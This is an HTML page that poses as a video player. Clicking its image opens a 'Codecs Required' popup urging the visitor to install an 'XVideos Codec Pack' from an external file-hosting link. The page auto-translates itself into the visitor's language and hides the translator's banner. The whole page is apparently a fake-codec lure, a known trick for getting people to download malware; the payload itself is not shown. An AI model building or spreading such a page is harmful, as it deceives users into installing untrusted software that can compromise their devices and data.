<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Full Video Access</title>
  <style>
    /* General Styles */
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background-color: #000;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: Arial, sans-serif;
    }

    img {
      max-width: 90vw;
      max-height: 90vh;
      cursor: pointer;
      user-select: none;
      -webkit-user-drag: none;
    }

    /* Modal Styles */
    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.8);
    }

    .modal-content {
      background-color: #fff;
      color: #000;
      margin: 10% auto;
      padding: 20px;
      border-radius: 8px;
      width: 90%;
      max-width: 400px;
      text-align: center;
    }

    .modal-content h2 {
      margin-top: 0;
    }

    .modal-buttons {
      margin-top: 20px;
      display: flex;
      justify-content: center;
      gap: 10px;
      flex-wrap: wrap;
    }

    .modal-buttons a,
    .modal-buttons button {
      padding: 10px 20px;
      font-size: 16px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      text-decoration: none;
      color: white;
    }

    .install-btn {
      background-color: #28a745;
    }

    .close-btn {
      background-color: #dc3545;
    }

    /* Hide Google Translate UI Elements */
    .goog-te-banner-frame.skiptranslate,
    .goog-te-gadget-icon,
    #goog-gt-tt,
    .goog-te-balloon-frame,
    .goog-te-menu-frame {
      display: none !important;
    }

    body > .skiptranslate {
      display: none !important;
    }

    body {
      top: 0 !important;
    }

    /* Optional: Show translator if needed */
    #google_translate_element {
      position: absolute;
      top: 10px;
      right: 10px;
      z-index: 9999;
    }
  </style>
</head>
<body>

  <!-- Image trigger -->
  <img src="ai_bot.png" alt="AI Bot" id="trigger">

  <!-- Modal Window -->
  <div class="modal" id="modal">
    <div class="modal-content">
      <h2>Codecs Required</h2>
      <p>To view the video, you need to install video codecs.</p>
      <div class="modal-buttons">
        <a
          href="https://ikx.filexspace.com/getfile/PJCCJ?title=XVideos%20Codec%20Pack"
          target="_blank"
          class="install-btn">Install</a>
        <button class="close-btn" id="closeBtn">Close</button>
      </div>
    </div>
  </div>

  <!-- Hidden Google Translate Element -->
  <div id="google_translate_element" style="display: none;"></div>

  <script>
    // Show modal when image is clicked
    document.getElementById('trigger').addEventListener('click', () => {
      document.getElementById('modal').style.display = 'block';
    });

    // Close modal on button click
    document.getElementById('closeBtn').addEventListener('click', () => {
      document.getElementById('modal').style.display = 'none';
    });

    // Close modal when clicking outside the modal content
    window.addEventListener('click', function (event) {
      if (event.target === document.getElementById('modal')) {
        document.getElementById('modal').style.display = 'none';
      }
    });

    // Google Translate Initialization
    function googleTranslateElementInit() {
      new google.translate.TranslateElement({
        pageLanguage: 'en',
        autoDisplay: false
      }, 'google_translate_element');

      const userLang = navigator.language || navigator.userLanguage;
      const langCode = userLang.split('-')[0];

      const interval = setInterval(() => {
        const select = document.querySelector('.goog-te-combo');
        if (select) {
          select.value = langCode;
          select.dispatchEvent(new Event('change'));
          clearInterval(interval);
        }
      }, 500);
    }
  </script>

  <!-- Load Google Translate API -->
  <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

</body>
</html>
